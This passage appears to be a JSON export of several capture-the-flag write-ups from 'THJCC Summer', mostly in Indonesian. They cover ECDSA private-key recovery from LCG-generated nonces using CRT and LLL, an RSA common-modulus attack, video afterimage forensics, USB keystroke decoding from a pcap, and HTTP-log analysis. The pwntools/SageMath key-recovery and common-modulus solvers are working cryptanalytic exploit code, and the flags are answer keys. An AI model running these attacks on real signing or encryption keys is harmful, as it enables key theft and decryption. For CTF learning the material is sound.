        "content": "Nilai nonce `k_i` berada pada rentang yang jauh lebih kecil dibandingkan modulus gabungan:\n\n$$\nM=n\\cdot p\n$$\n\nHal tersebut memungkinkan kita memanfaatkan **Lenstra–Lenstra–Lovász (LLL) lattice reduction** untuk mencari solusi dengan koefisien kecil.\n\nBasis lattice yang digunakan berbentuk:\n\n$$\n\\begin{bmatrix}\nM&0&\\cdots&0&0&0\\\n0&M&\\cdots&0&0&0\\\n\\vdots&\\vdots&\\ddots&\\vdots&\\vdots&\\vdots\\\n0&0&\\cdots&M&0&0\\\nC_1&C_2&\\cdots&C_N&1&0\\\nD_1&D_2&\\cdots&D_N&0&n\n\\end{bmatrix}\n$$\n\nSetelah basis direduksi menggunakan LLL, salah satu vektor pendek akan mengandung informasi mengenai nonce yang dicari.\n\nDari `k_0`, private key dapat dihitung langsung:\n\n$$\nd\\equiv B_0^{-1}(k_0-A_0)\\pmod n\n$$\n\n---"
      },
      {
        "title": "Skrip Solusi",
        "content": "Berikut solver lengkap menggunakan **pwntools** untuk berkomunikasi dengan server dan **SageMath** untuk perhitungan CRT serta LLL.\n\n```python\nfrom pwn import *\nimport re\nimport subprocess\n\ndef solve():\n    io = remote('chal.thjcc.org', 11451)\n    \n    io.recvuntil(b\"Generator params: \")\n    params = io.recvline().decode().strip()\n\n    a = int(\n        re.search(r'a = (0x[0-9a-f]+)', params).group(1),\n        16\n    )\n    b = int(\n        re.search(r'b = (0x[0-9a-f]+)', params).group(1),\n        16\n    )\n    \n    io.recvuntil(b\"Here are your signatures:\\n\")\n\n    sigs = []\n\n    while True:\n        line = io.recvline().decode().strip()\n\n        if \"Can you find the private key?\" in line:\n            break\n\n        if line.startswith('h ='):\n            h = int(line.split('=')[1].strip(), 16)\n            r = int(io.recvline().decode().split('=')[1].strip(), 16)\n            s = int(io.recvline().decode().split('=')[1].strip(), 16)\n\n            sigs.append((h, r, s))\n\n    sage_script = f'''\nimport sys\n\na = {a}\nb = {b}\nsigs = {sigs}\n\ncurves = [\n    (\n        \"secp256k1\",\n        0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f,\n        0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141\n    ),\n    (\n        \"secp256r1\",\n        0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff,\n        0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551\n    )\n]\n\ndef solve():\n    N = min(len(sigs), 15)\n\n    for name, p, n in curves:\n        A = []\n        B = []\n\n        for i in range(N):\n            h, r, s = sigs[i]\n\n            s_inv = inverse_mod(s, n)\n\n            A.append((h * s_inv) % n)\n            B.append((r * s_inv) % n)\n\n        B1_inv = inverse_mod(B[0], n)\n\n        C = []\n        D = []\n\n        U = 1\n        V = 0\n\n        M = n * p\n\n        for i in range(N):\n            # Dunia 1: modulo n\n            u_i = (B[i] * B1_inv) % n\n            v_i = (A[i] - u_i * A[0]) % n\n\n            # Gabungkan kedua dunia menggunakan CRT\n            c_i = crt(\n                [ZZ(u_i), ZZ(U)],\n                [ZZ(n), ZZ(p)]\n            )\n\n            d_i = crt(\n                [ZZ(v_i), ZZ(V)],\n                [ZZ(n), ZZ(p)]\n            )\n\n            C.append(c_i)\n            D.append(d_i)\n\n            # Dunia 2: LCG modulo p\n            U = (U * a) % p\n            V = (V * a + b) % p\n\n        mat = matrix(ZZ, N + 2, N + 2)\n\n        for i in range(N):\n            mat[i, i] = M\n            mat[N, i] = C[i]\n            mat[N + 1, i] = D[i]\n\n        mat[N, N] = 1\n        mat[N + 1, N + 1] = n\n\n        # LLL reduction\n        L = mat.LLL()\n\n        for row in L:\n            if abs(row[N + 1]) == n:\n                sign = 1 if row[N + 1] > 0 else -1\n                k1 = row[N] * sign\n\n                if 0 < k1 < n:\n                    d = (B1_inv * (k1 - A[0])) % n\n                    print(d)\n                    return\n\nsolve()\n'''\n\n    with open('solver.sage', 'w') as f:\n        f.write(sage_script)\n\n    output = subprocess.check_output(\n        ['sage', 'solver.sage'],\n        stderr=subprocess.STDOUT\n    ).decode().strip()\n\n    d = int(output.strip().split('\\n')[-1])\n\n    io.recvuntil(b\"Private Key (d) in hex: \")\n    io.sendline(hex(d).encode())\n\n    io.interactive()\n\n\nif __name__ == '__main__':\n    solve()\n```\n\n---"
      },
      {
        "title": "Hasil Eksekusi",
        "content": "Solver berhasil menemukan private key:\n\n```text\n0xd082afce549f0086dbb987d353f8eef32c9ee32cb300cf288ce337b61536c590\n```\n\nPrivate key tersebut kemudian dikirim kembali ke server:\n\n```text\nPrivate Key (d) in hex: 0xd082afce549f0086dbb987d353f8eef32c9ee32cb300cf288ce337b61536c590\n```\n\nServer menerima private key yang benar dan memberikan akses ke shell.\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\nimport re\r\nimport subprocess\r\nimport os\r\n\r\ndef solve():\r\n    host = 'chal.thjcc.org'\r\n    port = 11451\r\n    io = remote(host, port)\r\n    \r\n    log.info(\"Mengambil parameter LCG...\")\r\n    io.recvuntil(b\"Generator params: \")\r\n    params_line = io.recvline().decode().strip()\r\n    \r\n    a = int(re.search(r'a = (0x[0-9a-f]+)', params_line).group(1), 16)\r\n    b = int(re.search(r'b = (0x[0-9a-f]+)', params_line).group(1), 16)\r\n    \r\n    log.info(\"Mengambil data signatures...\")\r\n    io.recvuntil(b\"Here are your signatures:\\n\")\r\n    \r\n    sigs = []\r\n    while True:\r\n        line = io.recvline().decode().strip()\r\n        if \"Can you find the private key?\" in line:\r\n            break\r\n        if line.startswith('h ='):\r\n            h = int(line.split('=')[1].strip(), 16)\r\n            r = int(io.recvline().decode().split('=')[1].strip(), 16)\r\n            s = int(io.recvline().decode().split('=')[1].strip(), 16)\r\n            sigs.append((h, r, s))\r\n            \r\n    log.success(f\"Berhasil memuat {len(sigs)} signatures.\")\r\n    \r\n    # Generate script SageMath untuk menggabungkan 2 Dunia dengan CRT & Lattice\r\n    sage_script = f'''\r\nimport sys\r\n\r\na = {a}\r\nb = {b}\r\nsigs = {sigs}\r\n\r\ncurves = [\r\n    (\"secp256k1\", 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f, 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141),\r\n    (\"secp256r1\", 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff, 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551)\r\n]\r\n\r\ndef solve():\r\n    N = min(len(sigs), 15)  # 15 signature udah lebih dari cukup buat Lattice\r\n    \r\n    for name, p, n in curves:\r\n        A = []\r\n        B = []\r\n        for i in range(N):\r\n            h, r, s = sigs[i]\r\n            s_inv = inverse_mod(s, n)\r\n            A.append((h * s_inv) % n)\r\n            B.append((r * s_inv) % n)\r\n        \r\n        B1_inv = inverse_mod(B[0], n)\r\n        \r\n        C = []\r\n        D = []\r\n        \r\n        U = 1\r\n        V = 0\r\n        M = n * p\r\n        \r\n        for i in range(N):\r\n            # Dunia 1: Modulo n (Berasal dari ECDSA)\r\n            u_i = (B[i] * B1_inv) % n\r\n            v_i = (A[i] - u_i * A[0]) % n\r\n            \r\n            # Menggabungkan dua dunia dengan CRT (Chinese Remainder Theorem)\r\n            c_i = crt([ZZ(u_i), ZZ(U)], [ZZ(n), ZZ(p)])\r\n            d_i = crt([ZZ(v_i), ZZ(V)], [ZZ(n), ZZ(p)])\r\n            \r\n            C.append(c_i)\r\n            D.append(d_i)\r\n            \r\n            # Dunia 2: Modulo p (Berasal dari state PRNG LCG)\r\n            U = (U * a) % p\r\n            V = (V * a + b) % p\r\n            \r\n        # Bangun Matriks Lattice\r\n        mat = matrix(ZZ, N + 2, N + 2)\r\n        for i in range(N):\r\n            mat[i, i] = M\r\n            mat[N, i] = C[i]\r\n            mat[N+1, i] = D[i]\r\n        \r\n        mat[N, N] = 1\r\n        mat[N+1, N+1] = n\r\n        \r\n        # Reduksi LLL\r\n        L = mat.LLL()\r\n        \r\n        for row in L:\r\n            if abs(row[N+1]) == n:\r\n                sign = 1 if row[N+1] > 0 else -1\r\n                k1 = row[N] * sign\r\n                \r\n                # Jika k1 valid, ekstrak Private Key (d)\r\n                if 0 < k1 < n:\r\n                    d = (B1_inv * (k1 - A[0])) % n\r\n                    print(d)\r\n                    return\r\nsolve()\r\n'''\r\n    with open('solver_lattice.sage', 'w') as f:\r\n        f.write(sage_script)\r\n        \r\n    log.info(\"Menjalankan SageMath (CRT + LLL Lattice)...\")\r\n    try:\r\n        output = subprocess.check_output(\r\n            ['sage', 'solver_lattice.sage'], \r\n            stderr=subprocess.STDOUT\r\n        ).decode().strip()\r\n    except subprocess.CalledProcessError as e:\r\n        log.error(f\"Error SageMath:\\n{e.output.decode('utf-8', errors='ignore')}\")\r\n        io.close()\r\n        return\r\n        \r\n    if not output:\r\n        log.error(\"Lattice gagal menemukan private key.\")\r\n        io.close()\r\n        return\r\n        \r\n    try:\r\n        d = int(output.strip().split('\\n')[-1])\r\n        log.success(f\"BINGO! Private Key (d) Ditemukan: {hex(d)}\")\r\n        \r\n        io.recvuntil(b\"Private Key (d) in hex: \")\r\n        io.sendline(hex(d).encode())\r\n        log.info(\"Tembus shell! Silakan catat flag-nya di bawah ini:\")\r\n        io.interactive()\r\n    except Exception as e:\r\n        log.error(f\"Gagal parse output dari Sage:\\n{output}\")\r\n        io.close()\r\n\r\nif __name__ == '__main__':\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{w0w_y0u_f0und_th3_h1dd3n_d3lt4_b3tw33n_p_4nd_q!}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-crypto-twoexponents",
    "title": "Two Exponents (medium)",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Marketing and Legal both encrypted the same internal memo. Marketing used the\npublic exponent they found on a sticky note, Legal used the one from the wiki.\nNobody thought to give them different moduli.",
    "problemDescription": "Marketing and Legal both encrypted the same internal memo. Marketing used the\npublic exponent they found on a sticky note, Legal used the one from the wiki.\nNobody thought to give them different moduli.\n\nFiles: `output.txt`\n\n> Hint: the classic attack wants `gcd(e1, e2) == 1`. Check that assumption\n> before you trust it.\n\nFlag format: `THJCC{...}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "# solve.py\r\nn  = 77858147671482407634775491427040805492076980205563716402246138065521424847352748333947251695438000383243920464095595462728641255858191058453473003730294210301598211003700846609849972322991848231552293626273416217314260783103263284010287945923693495357051277469279606933481196189861065420108007616409643776013\r\ne1 = 111\r\nc1 = 18223062994297197653234717982144573569773880742037431830544439999553795195125626505331124696776901462144736197874973901036255517289372748992723223498997000791202721932133429983002886149582411413191392795467958837528737663052532838054771927153786855378458367115645172309532793321789113491998416988084430368204\r\ne2 = 39\r\nc2 = 76348018939213272185590808359388052466934484463344890672730708364972146374564171707212345714373329559752891016395108524379113926994557487020813255966324592722174363480000800186421273525315732093443649340134436194571066648858343990234218106682132787231616400778754021668597178594337592606373176172822415096792\r\n\r\n# Extended Euclidean Algorithm\r\ndef xgcd(a, b):\r\n    if a == 0:\r\n        return b, 0, 1\r\n    g, y, x = xgcd(b % a, a)\r\n    return g, x - (b // a) * y, y\r\n\r\n# Fungsi Binary Search untuk integer root (K-th root)\r\ndef iroot(k, n_val):\r\n    u, s = n_val, n_val + 1\r\n    while u < s:\r\n        s = u\r\n        t = (k - 1) * s + n_val // pow(s, k - 1)\r\n        u = t // k\r\n    return s\r\n\r\ndef solve():\r\n    print(\"[*] Memulai Modified Common Modulus Attack...\")\r\n    g, a, b = xgcd(e1, e2)\r\n    print(f\"[*] gcd({e1}, {e2}) = {g}\")\r\n    print(f\"[*] Koefisien ditemukan: a = {a}, b = {b}\")\r\n\r\n    # Menghitung C = (c1^a * c2^b) mod n\r\n    # Python 3.8+ otomatis melakukan modular inverse jika nilai pangkat (a/b) bernilai negatif.\r\n    C = (pow(c1, a, n) * pow(c2, b, n)) % n\r\n    print(f\"[*] Berhasil menghitung m^{g} mod n\")\r\n\r\n    # Pencarian akar pangkat (kemungkinan m^3 < n, namun kita loop jaga-jaga jika wraparound modulus)\r\n    for k in range(100):\r\n        val = C + k * n\r\n        m = iroot(g, val)\r\n        \r\n        # Cek jika nilai hasil perhitungan valid \r\n        if pow(m, g) == val:\r\n            print(f\"[*] Integer root yang persis ditemukan pada k={k}!\")\r\n            \r\n            # Konversi Integer ke Bytes ASCII untuk mendapatkan flag\r\n            flag_bytes = m.to_bytes((m.bit_length() + 7) // 8, 'big')\r\n            try:\r\n                flag_text = flag_bytes.decode('utf-8')\r\n                print(f\"\\n[+] FLAG: {flag_text}\")\r\n                break\r\n            except UnicodeDecodeError:\r\n                pass\r\n\r\nif __name__ == '__main__':\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{...}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-crypto-",
    "title": "お昼はサイゼリヤに行こうニャ！",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "寫著四顆種子的便條紙，被ヤニ子當成 10mg 捲掉了ニャ。\n房東手上只剩當年產表的程式和一份算好的表，門總得開。",
    "problemDescription": "寫著四顆種子的便條紙，被ヤニ子當成 10mg 捲掉了ニャ。\n房東手上只剩當年產表的程式和一份算好的表，門總得開。\n\n\n檔案\n----\n\ngen_table.py    當年產出下面三個檔案的程式\nshadow.txt      五個住戶的密語雜湊\nnyan.tbl        那份算好的表\nflag.enc        加密的 flag\nnote.png        牆上那張便條紙\nnote.txt        便條紙的純文字版\n\n\n房東的話\n--------\n\n「那四個數字啊……都是這棟樓的房客。\n\n三個是年紀。剩下那個是有人在 YouTube 那種網站上開了頻道，訂閱她的人數，\n整天關在房裡打電動直播，吵死了。\n\n誰是誰、什麼順序，你自己去問他們，我懶得記。\n\n反正你要是填對了，那張表自己會告訴你。」",
    "tools": [],
    "analysis": "",
    "solution": [],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-foren-afterimage1",
    "title": "Afterimage1 - Writeup",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Afterimage1 - Writeup",
    "problemDescription": "File yang diberikan adalah `challenge.mp4`. Flag tidak muncul sebagai text biasa di file dan bukan berasal dari metadata C2PA. Jalur yang benar adalah mengambil informasi dari **efek afterimage** pada frame video: objek cahaya kecil bergerak cepat dan meninggalkan jejak temporal. Setelah frame diekstrak lalu perubahan antar-frame diakumulasi, pola tersembunyi dapat dibaca.\n\n**Flag:**\n\n```text\nTHJCC{v1d3o_F0ren51cS_qkrejnga}\n```\n\n---",
    "tools": [],
    "analysis": "Karena flag disembunyikan secara temporal, frame perlu digabung dengan metode yang menonjolkan perubahan cahaya.\n\nProses yang digunakan:\n\n1. Mengubah frame menjadi grayscale/luminance.\n2. Menghitung perbedaan dengan frame sebelumnya.\n3. Mengambil area yang mengalami perubahan signifikan.\n4. Memfokuskan pada objek bercahaya hangat/oranye.\n5. Mengakumulasi seluruh perubahan.\n6. Menggunakan normalisasi log agar jejak cahaya yang redup tetap terlihat.\n\nScript rekonstruksi:\n\n```python\nimport cv2\nimport numpy as np\n\nVIDEO = 'challenge.mp4'\nOUT = 'afterimage_acc.png'\n\ncap = cv2.VideoCapture(VIDEO)\nprev = None\nacc = None\n\nwhile True:\n    ok, frame = cap.read()\n    if not ok:\n        break\n\n    frame = frame.astype(np.float32)\n\n    # luminance untuk motion/difference\n    gray = cv2.cvtColor(\n        frame.astype(np.uint8),\n        cv2.COLOR_BGR2GRAY\n    ).astype(np.float32)\n\n    # channel BGR\n    b, g, r = cv2.split(frame)\n\n    # titik flag lebih dominan hangat/terang\n    # dibanding background biru-ungu\n    warm = np.maximum((r + g) - (1.35 * b), 0)\n    bright = np.maximum(gray - 90, 0)\n\n    if prev is None:\n        prev = gray\n        acc = np.zeros_like(gray, dtype=np.float32)\n        continue\n\n    diff = cv2.absdiff(gray, prev)\n\n    # motion + cahaya hangat\n    mask = (diff > 6).astype(np.float32)\n    signal = warm * bright * mask\n\n    acc += signal\n    prev = gray\n\ncap.release()\n\n# log scale agar afterimage yang redup ikut terlihat\nacc = np.log1p(acc)\nacc = acc / acc.max() * 255\nacc = acc.astype(np.uint8)\n\n# sedikit perjelas\nacc = cv2.equalizeHist(acc)\n\ncv2.imwrite(OUT, acc)\n\nprint('[+] saved', OUT)\n```\n\nJalankan:\n\n```bash\npython3 solve_afterimage.py\n```\n\nHasilnya menyatukan jejak cahaya yang sebelumnya tersebar di berbagai frame. Dari akumulasi tersebut, pattern text mulai terlihat.\n\n---",
    "solution": [
      {
        "title": "1. Recon File",
        "content": "Cek tipe file:\n\n```bash\nfile challenge.mp4\n```\n\nOutput menunjukkan file adalah MP4 valid:\n\n```text\nchallenge.mp4: ISO Media, MP4 Base Media v1 [ISO 14496-12:2003]\n```\n\nCek stream video/audio:\n\n```bash\nffprobe -v error -show_format -show_streams challenge.mp4\n```\n\nInformasi penting:\n\n* Codec video: H.264\n* Resolusi: `1280x720`\n* Frame rate: `24 FPS`\n* Jumlah frame: `240`\n* Audio: AAC, `48000 Hz`, stereo\n* Durasi: sekitar 10 detik\n\nKarena judul challenge adalah **Afterimage1**, analisis diarahkan ke perubahan antar-frame, bukan hanya mencari informasi pada satu frame statis.\n\n---"
      },
      {
        "title": "2. Triage Cepat",
        "content": "Cari flag langsung dari raw bytes:\n\n```bash\nstrings -a challenge.mp4 | grep -Ei 'THJCC|flag|ctf|{'\n```\n\nTidak ditemukan flag yang valid.\n\nYang muncul justru metadata C2PA/SynthID seperti:\n\n```text\nurn:c2pa:4adeac53-4fe2-35e1-1656-4237d7c2d5ac\n6a6aafee-32f5-49a8-86fc-4581cb57f176\n019c34d3-733f-7a47-b917-50dd38f41ece\n```\n\nUUID tersebut sempat terlihat seperti kandidat flag, tetapi semuanya salah saat disubmit. Oleh karena itu, metadata C2PA diperlakukan sebagai **red herring**.\n\nCek metadata tambahan:\n\n```bash\nexiftool challenge.mp4\n```\n\nTidak ada field yang secara langsung menyimpan flag. Metadata hanya mengarah ke informasi generative media / SynthID.\n\n---"
      },
      {
        "title": "3. Extract Frame",
        "content": "Semua frame diekstrak agar dapat dianalisis satu per satu:\n\n```bash\nmkdir -p frames\nffmpeg -hide_banner -i challenge.mp4 -vsync 0 frames/%04d.png\n```\n\nKemudian dibuat contact sheet untuk melihat perubahan besar antar-frame:\n\n```bash\npython3 - <<'PY'\nfrom PIL import Image, ImageDraw\nimport glob, math\n\nfiles = sorted(glob.glob('frames/*.png'))[::10]\nthumbs = []\n\nfor i, f in enumerate(files):\n    im = Image.open(f).resize((256, 144))\n    d = ImageDraw.Draw(im)\n    d.text((6, 6), str(i * 10 + 1).zfill(3), fill=(255, 255, 255))\n    thumbs.append(im)\n\ncols = 4\nrows = math.ceil(len(thumbs) / cols)\n\nout = Image.new('RGB', (cols * 256, rows * 144), 'black')\n\nfor i, im in enumerate(thumbs):\n    out.paste(im, ((i % cols) * 256, (i // cols) * 144))\n\nout.save('sheet10.png')\nPY\n```\n\nDari contact sheet terlihat adanya banyak titik cahaya kecil yang bergerak atau menyala pada frame-frame tertentu.\n\nKarena titik-titik tersebut tersebar di beberapa frame, teks tidak dapat dibaca dengan baik dari satu frame saja.\n\n---"
      },
      {
        "title": "5. Memperjelas Hasil",
        "content": "Jika hasil masih terlalu redup, threshold dan contrast dapat dinaikkan:\n\n```bash\npython3 - <<'PY'\nimport cv2\n\nimg = cv2.imread('afterimage_acc.png', 0)\n\nimg = cv2.GaussianBlur(img, (3, 3), 0)\nimg = cv2.normalize(\n    img,\n    None,\n    0,\n    255,\n    cv2.NORM_MINMAX\n)\n\n_, th = cv2.threshold(\n    img,\n    145,\n    255,\n    cv2.THRESH_BINARY\n)\n\ncv2.imwrite('afterimage_threshold.png', th)\n\nprint('[+] saved afterimage_threshold.png')\nPY\n```\n\nSetelah rekonstruksi dan peningkatan contrast, bagian teks yang terbaca adalah:\n\n```text\nv1d3o_F0ren51cS_qkrejnga\n```\n\nChallenge menggunakan prefix `THJCC{...}`, sehingga flag final adalah:\n\n```text\nTHJCC{v1d3o_F0ren51cS_qkrejnga}\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{v1d3o_F0ren51cS_qkrejnga}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-foren-afterimage2",
    "title": "Afterimage2",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Afterimage2",
    "problemDescription": "Artefak yang dikasih berupa capture USB dalam format PCAP. Traffic-nya berisi report HID keyboard, jadi flag bisa diambil dengan decode keycode USB dari setiap packet interrupt transfer.\n\nFlag yang didapat:\n\n```\nTHJCC{hid_k3y5tr0k3_l34k}\n```",
    "tools": [],
    "analysis": "Cek tipe file:\n\n```bash\nfile usb_capture.pcap.zip\nunzip -l usb_capture.pcap.zip\nunzip -o usb_capture.pcap.zip\nfile usb_capture.pcap\n```\n\nHasil penting:\n\n```\nusb_capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Memory-mapped Linux USB, capture length 262144)\n```\n\nLink type PCAP menunjukkan capture USB Linux. Packet di dalamnya ukurannya kecil dan konsisten, cocok dengan USB HID report.\n\nSetiap packet punya header Linux usbmon 64 byte, lalu data report 8 byte.\n\nContoh beberapa report:\n\n```\n02 00 17 00 00 00 00 00\n00 00 00 00 00 00 00 00\n02 00 0b 00 00 00 00 00\n00 00 00 00 00 00 00 00\n02 00 0d 00 00 00 00 00\n```\n\nFormat HID keyboard report:\n\n```\nbyte 0   : modifier\nbyte 1   : reserved\nbyte 2-7 : keycode aktif\n```\n\nModifier `0x02` berarti left shift. Jadi keycode yang sama bisa berubah menjadi huruf besar atau simbol.\n\nContoh mapping:\n\n```\n0x17 + shift = T\n0x0b + shift = H\n0x0d + shift = J\n0x06 + shift = C\n0x2f + shift = {\n0x2d + shift = _\n0x30 + shift = }\n```\n\nPacket kosong `00 00 00 00 00 00 00 00` adalah key release, jadi dilewati.\n\n### Algoritma Decoding\n\nLangkah decode:\n\n1. Extract `usb_capture.pcap` dari ZIP.\n2. Parse classic PCAP header.\n3. Untuk setiap packet, ambil payload setelah offset 64 byte.\n4. Baca 8 byte HID keyboard report.\n5. Ambil keycode pada byte ke-2 sampai byte ke-7.\n6. Gunakan modifier `0x02` atau `0x20` untuk shift.\n7. Decode keycode USB HID menjadi karakter.\n8. Gabungkan karakter sampai membentuk flag.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "```\nusb_capture.pcap.zip\n```\n\nIsi ZIP:\n\n```\nusb_capture.pcap\n__MACOSX/._usb_capture.pcap\n```\n\nFile utama yang dipakai adalah `usb_capture.pcap`. File `__MACOSX/...` cuma metadata AppleDouble dan tidak diperlukan."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` dibuat untuk parsing PCAP secara langsung tanpa bergantung ke `tshark`.\n\nScript membaca ZIP atau PCAP mentah, lalu melakukan decode HID keyboard report.\n\nBagian penting:\n\n```python\nreport = pkt[64:72]\nmod = report[0]\ncodes = [c for c in report[2:8] if c]\n```\n\nMapping USB HID dipakai untuk mengubah keycode menjadi karakter."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\npython3 solve.py usb_capture.pcap.zip\n```\n\nOutput:\n\n```\nTHJCC{hid_k3y5tr0k3_l34k}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport struct\r\nimport sys\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nKEYS = {\r\n    0x04: ('a','A'), 0x05: ('b','B'), 0x06: ('c','C'), 0x07: ('d','D'),\r\n    0x08: ('e','E'), 0x09: ('f','F'), 0x0a: ('g','G'), 0x0b: ('h','H'),\r\n    0x0c: ('i','I'), 0x0d: ('j','J'), 0x0e: ('k','K'), 0x0f: ('l','L'),\r\n    0x10: ('m','M'), 0x11: ('n','N'), 0x12: ('o','O'), 0x13: ('p','P'),\r\n    0x14: ('q','Q'), 0x15: ('r','R'), 0x16: ('s','S'), 0x17: ('t','T'),\r\n    0x18: ('u','U'), 0x19: ('v','V'), 0x1a: ('w','W'), 0x1b: ('x','X'),\r\n    0x1c: ('y','Y'), 0x1d: ('z','Z'),\r\n    0x1e: ('1','!'), 0x1f: ('2','@'), 0x20: ('3','#'), 0x21: ('4','$'),\r\n    0x22: ('5','%'), 0x23: ('6','^'), 0x24: ('7','&'), 0x25: ('8','*'),\r\n    0x26: ('9','('), 0x27: ('0',')'),\r\n    0x28: ('\\n','\\n'), 0x2c: (' ', ' '), 0x2d: ('-','_'), 0x2e: ('=','+'),\r\n    0x2f: ('[','{'), 0x30: (']','}'), 0x31: ('\\\\','|'), 0x33: (';',':'),\r\n    0x34: (\"'\", '\"'), 0x35: ('`','~'), 0x36: (',','<'), 0x37: ('.','>'),\r\n    0x38: ('/','?'),\r\n}\r\n\r\nSHIFT_MASK = 0x22  # left shift 0x02, right shift 0x20\r\n\r\n\r\ndef read_pcap_from_zip_or_file(path: Path) -> bytes:\r\n    data = path.read_bytes()\r\n    if data[:4] == b'PK\\x03\\x04':\r\n        with zipfile.ZipFile(path) as zf:\r\n            names = [n for n in zf.namelist() if n.endswith('.pcap') and not n.startswith('__MACOSX/')]\r\n            if not names:\r\n                raise SystemExit('no .pcap found inside zip')\r\n            return zf.read(names[0])\r\n    return data\r\n\r\n\r\ndef iter_pcap_packets(blob: bytes):\r\n    if len(blob) < 24:\r\n        raise SystemExit('pcap too small')\r\n    magic = blob[:4]\r\n    if magic == b'\\xd4\\xc3\\xb2\\xa1':\r\n        endian = '<'\r\n    elif magic == b'\\xa1\\xb2\\xc3\\xd4':\r\n        endian = '>'\r\n    else:\r\n        raise SystemExit('not a classic pcap')\r\n\r\n    off = 24\r\n    while off + 16 <= len(blob):\r\n        ts_sec, ts_usec, incl_len, orig_len = struct.unpack_from(endian + 'IIII', blob, off)\r\n        off += 16\r\n        pkt = blob[off:off + incl_len]\r\n        off += incl_len\r\n        yield ts_sec, ts_usec, pkt\r\n\r\n\r\ndef decode_usb_keyboard(blob: bytes) -> str:\r\n    out = []\r\n    prev_codes = set()\r\n\r\n    for _ts, _usec, pkt in iter_pcap_packets(blob):\r\n        # Linux usbmon mmap header is 64 bytes. Keyboard interrupt reports follow it.\r\n        if len(pkt) < 72:\r\n            continue\r\n\r\n        report = pkt[64:72]\r\n        mod = report[0]\r\n        codes = [c for c in report[2:8] if c]\r\n        current = set(codes)\r\n\r\n        # Skip key release packets and avoid repeated held keys.\r\n        for code in codes:\r\n            if code in prev_codes:\r\n                continue\r\n            if code == 0x2a:  # backspace\r\n                if out:\r\n                    out.pop()\r\n                continue\r\n            if code not in KEYS:\r\n                continue\r\n            shifted = bool(mod & SHIFT_MASK)\r\n            out.append(KEYS[code][1 if shifted else 0])\r\n\r\n        prev_codes = current\r\n\r\n    return ''.join(out)\r\n\r\n\r\ndef main():\r\n    path = Path(sys.argv[1]) if len(sys.argv) > 1 else Path('usb_capture.pcap.zip')\r\n    blob = read_pcap_from_zip_or_file(path)\r\n    text = decode_usb_keyboard(blob)\r\n    print(text)\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{hid_k3y5tr0k3_l34k}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-foren-nono",
    "title": "NoNo",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge NoNo",
    "problemDescription": "",
    "tools": [],
    "analysis": "Dari deskripsi challenge, artefak utama yang perlu dianalisis adalah HTTP logs.\n\nTujuannya adalah mencari request yang tidak biasa, kemudian mengikuti alur request tersebut sampai menemukan endpoint tersembunyi.\n\nLangkah awal yang bisa dilakukan adalah melakukan inspeksi terhadap log:\n\n```bash\nhead -n 20 <logfile>\n```\n\nLalu mencari request HTTP yang mencurigakan:\n\n```bash\ngrep -Ei 'GET|POST|secret|report|internal' <logfile>\n```\n\natau:\n\n```bash\ngrep -oE '(/[A-Za-z0-9_./%-]+)' <logfile> | sort | uniq -c | sort -nr\n```\n\nHal penting pada challenge ini bukan hanya melihat satu request, tetapi mengikuti urutan/stream aktivitas HTTP.\n\nSetelah mengikuti request-request yang berkaitan, terlihat adanya path tersembunyi:\n\n```\n/s3cr3t/rep0rt/\n```\n\nTarget service yang digunakan adalah:\n\n```\nchal.thjcc.org:50000\n```\n\nSehingga endpoint lengkapnya:\n\n```\nhttp://chal.thjcc.org:50000/s3cr3t/rep0rt/\n```",
    "solution": [
      {
        "title": "Challenge",
        "content": "**Title:** NoNo\n**Category:** Forensics\n**Description:**\n\n```\nOur SOC pulled the HTTP logs off chal.thjcc.org after an alert fired overnight. Find the secret message within these logs :)\n```\n\n**Flag format:**\n\n```\nTHJCC{...}\n```"
      },
      {
        "title": "Retrieving the Hidden Report",
